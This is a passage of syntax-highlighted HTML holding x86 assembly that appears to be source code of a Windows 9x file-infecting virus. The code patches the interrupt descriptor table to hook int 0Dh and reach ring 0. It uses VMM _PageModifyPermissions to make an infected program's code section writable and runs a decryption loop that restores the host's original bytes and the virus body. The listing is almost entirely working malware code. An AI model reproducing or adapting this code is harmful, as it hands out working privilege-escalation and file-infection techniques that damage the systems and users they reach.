</span><span class="sc5">oe_virt_rva</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 0c 0d 0e 0f  align: objectalign</span><span class="sc0">
</span><span class="sc5">oe_phys_size</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 10 11 12 13</span><span class="sc0">
</span><span class="sc5">oe_phys_offs</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 14 15 16 17  align: filealign</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">12</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc1">;for obj file</span><span class="sc0">
</span><span class="sc5">oe_section_flags</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">        </span><span class="sc1">; 24 25 26 27</span><span class="sc0">
                        </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc5">VxDcall</span><span class="sc0">                 </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc5">Service</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0CDh</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">020h</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">Service</span><span class="sc0">
                        </span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">VMMcall</span><span class="sc0">                 </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc5">Service</span><span class="sc0">
                        </span><span class="sc5">VxDcall</span><span class="sc0"> </span><span class="sc5">VMM</span><span class="sc4">&amp;</span><span class="sc5">Service</span><span class="sc4">&amp;</span><span class="sc0">
                        </span><span class="sc9">endm</span><span class="sc0">

                        </span><span class="sc5">p386</span><span class="sc0">
                        </span><span class="sc5">model</span><span class="sc0">   </span><span class="sc10">flat</span><span class="sc0">

                        </span><span class="sc5">locals</span><span class="sc0">  </span><span class="sc5">__</span><span class="sc0">
                        </span><span class="sc5">jumps</span><span class="sc0">

                        </span><span class="sc9">.code</span><span class="sc0">

</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0b8h</span><span class="sc0">
</span><span class="sc5">@@kbase</span><span class="sc0">                 </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">replace_start</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">

                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">

                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">sdata</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">sdata</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
                        </span><span class="sc6">cld</span><span class="sc0">

</span><span class="sc5">sdata</span><span class="sc0">                   </span><span class="sc9">struc</span><span class="sc0">
</span><span class="sc5">kernel_ptr_r3</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">dllbase</span><span class="sc0">                 </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">idtr</span><span class="sc0">                    </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">fword</span><span class="sc0">
</span><span class="sc5">idt_limit</span><span class="sc0">               </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">idt_base</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">idt_entry_saved</span><span class="sc0">         </span><span class="sc9">dq</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">r3_vir_copy</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">vir_size</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
                        </span><span class="sc9">align</span><span class="sc0">   </span><span class="sc2">16</span><span class="sc0">
                        </span><span class="sc9">ends</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">dllbase</span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFF0000h</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">65536</span><span class="sc0">
</span><span class="sc5">__again</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">65536</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'ZM'</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__again</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">kernel_ptr_r3</span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc5">x</span><span class="sc0">                       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">&lt;[</span><span class="sc8">ebp</span><span class="sc4">]-</span><span class="sc2">401000h</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">y</span><span class="sc0">                       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">&lt;+(</span><span class="sc5">vir_copy</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">)&gt;</span><span class="sc0">

                        </span><span class="sc6">pusha</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_base_ebp</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">@@vir_type</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__skip</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@orig_rva</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@imagebase</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">vir_size_infile</span><span class="sc4">/</span><span class="sc2">4</span><span class="sc0">
                        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">lodsd</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@vir_rva</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@imagebase</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">vir_size_infile</span><span class="sc4">/</span><span class="sc2">4</span><span class="sc0">
                        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">lodsd</span><span class="sc0">
</span><span class="sc5">__skip</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc6">popa</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_base_eax</span><span class="sc0">
                        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r3_vir_copy</span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">vir_size</span><span class="sc0">
                        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

                        </span><span class="sc6">sidt</span><span class="sc0">    </span><span class="sc5">idtr</span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">idt_base</span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc0">

                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">idt_entry_saved</span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">

                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">

                        </span><span class="sc6">movsd</span><span class="sc0">
                        </span><span class="sc6">movsd</span><span class="sc0">

                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc1">;               2 2 2 2 2 1 1 1 1 1 1 1 1 1 1</span><span class="sc0">
</span><span class="sc1">;31             4 3 2 1 0 9 8 7 6 5 4 3 2 1 0 9 8 7 6 5 4      0</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;|                               | | D |         |     |          |</span><span class="sc0">
</span><span class="sc1">;|           RESERVED            |P| P |0 1 1 1 0|0 0 0| RESERVED | +4</span><span class="sc0">
</span><span class="sc1">;|                               | | L |         |     |          |</span><span class="sc0">
</span><span class="sc1">;|----------------------------------------------------------------|</span><span class="sc0">
</span><span class="sc1">;|       SEGMENT SELECTOR        |         OFFSET  15:00          | +0</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">; P      1      segment present</span><span class="sc0">
</span><span class="sc1">; DPL    11     ring 3</span><span class="sc0">
</span><span class="sc1">;        01110  const</span><span class="sc0">

</span><span class="sc5">c_idt_desc_offs</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">int0D</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">
</span><span class="sc5">c_idt_desc_selector</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">28h</span><span class="sc0">
</span><span class="sc5">c_idt_desc_type</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">1110111000000000b</span><span class="sc0">   </span><span class="sc1">; P=1 DPL=3 01110=CONST</span><span class="sc0">

</span><span class="sc1">;                       dw      c_idt_desc_offs and 65535</span><span class="sc0">
</span><span class="sc1">;                       dw      c_idt_desc_selector</span><span class="sc0">
</span><span class="sc1">;                       dw      c_idt_desc_type</span><span class="sc0">
</span><span class="sc1">;                       dw      c_idt_desc_offs shr 16</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">100000</span><span class="sc0">     </span><span class="sc1">; to avoid fuckup because of</span><span class="sc0">
</span><span class="sc5">__wait</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">         </span><span class="sc1">; twice-patched IDT</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">88h</span><span class="sc0">
                        </span><span class="sc6">loope</span><span class="sc0">   </span><span class="sc5">__wait</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">88h</span><span class="sc0">
                        </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">

                        </span><span class="sc6">pusha</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_base_eax</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">c_idt_desc_offs</span><span class="sc0">
                        </span><span class="sc6">stosw</span><span class="sc0">
                        </span><span class="sc6">shld</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">c_idt_desc_selector</span><span class="sc0">
                        </span><span class="sc6">stosw</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">c_idt_desc_type</span><span class="sc0">
                        </span><span class="sc6">stosw</span><span class="sc0">
                        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">stosw</span><span class="sc0">
                        </span><span class="sc6">popa</span><span class="sc0">

                        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">0Dh</span><span class="sc0">

                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">sdata</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
                        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">naebka_1</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">naebka_2</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">naebka_4</span><span class="sc0">

</span><span class="sc5">back_from_r0</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">sdata</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">int0D</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc6">movsd</span><span class="sc0">
                        </span><span class="sc6">movsd</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                        </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">vx_init</span><span class="sc0">

                        </span><span class="sc6">cli</span><span class="sc0">

                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">kernel_ptr_r3</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_base_ebp</span><span class="sc0">

</span><span class="sc5">PC_WRITEABLE</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00020000H</span><span class="sc0">
</span><span class="sc5">PC_USER</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00040000H</span><span class="sc0">
</span><span class="sc5">PC_STATIC</span><span class="sc0">               </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">20000000H</span><span class="sc0">

</span><span class="sc5">VMM_PageModifyPermissions</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">000010133h</span><span class="sc0">

                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">@@vir_type</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__skip_1</span><span class="sc0">

</span><span class="sc5">xx_offs</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">50h</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">xx_offs</span><span class="sc0">

                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc5">.dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc5">.dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">

                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">__vxd_ret</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">

                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">PC_WRITEABLE</span><span class="sc4">+</span><span class="sc5">PC_STATIC</span><span class="sc4">+</span><span class="sc5">PC_USER</span><span class="sc0">     </span><span class="sc1">; OR_MASK</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">; AND_MASK</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">@@codesect_pagecount</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">@@codesect_pageaddr12</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
</span><span class="sc1">;                       VMMcall _PageModifyPermissions</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc5">.word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20CDh</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc5">.dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">VMM_PageModifyPermissions</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc5">.word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E6FFh</span><span class="sc0">  </span><span class="sc1">; jmp esi</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">__vxd_ret</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">

                        </span><span class="sc6">cli</span><span class="sc0">

                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc5">.dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc5">.dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

                        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc5">@@codesect_flags</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80000000h</span><span class="sc0">
                        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">__go</span><span class="sc0">

                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">PC_STATIC</span><span class="sc4">+</span><span class="sc5">PC_USER</span><span class="sc0">     </span><span class="sc1">; OR_MASK</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc5">PC_WRITEABLE</span><span class="sc0">          </span><span class="sc1">; AND_MASK</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">@@codesect_pagecount</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">@@codesect_pageaddr12</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc5">VMMcall</span><span class="sc0"> </span><span class="sc5">_PageModifyPermissions</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">

                        </span><span class="sc6">cli</span><span class="sc0">
</span><span class="sc5">__go</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">__skip_1</span><span class="sc4">:</span><span class="sc0">

                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ring0_code</span><span class="sc0">

                        </span><span class="sc6">cli</span><span class="sc0">

                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">

                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r3_vir_copy</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">__r3stack</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">__r3stack</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">dllbase</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_base_ebp</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@imagebase</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">

                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">@@vir_type</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__skip_2</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@decr_key</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@orig_rva</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">@@vir_rva</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">vir_size_infile</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                        </span><span class="sc6">cld</span><span class="sc0">

</span><span class="sc1">;                       in      al, 61h</span><span class="sc0">
</span><span class="sc1">;                       or      al, 3</span><span class="sc0">
</span><span class="sc1">;                       out     61h, al</span><span class="sc0">

</span><span class="sc5">__decr_1</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc6">lodsd</span><span class="sc0">

                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                        </span><span class="sc6">stosd</span><span class="sc0">

                        </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">

                        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">__decr_1</span><span class="sc0">

</span><span class="sc1">;                       in      al, 61h</span><span class="sc0">
</span><span class="sc1">;                       and     al, not 3</span><span class="sc0">
</span><span class="sc1">;                       out     61h, al</span><span class="sc0">

                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc5">__skip_2</span><span class="sc4">:</span><span class="sc0">
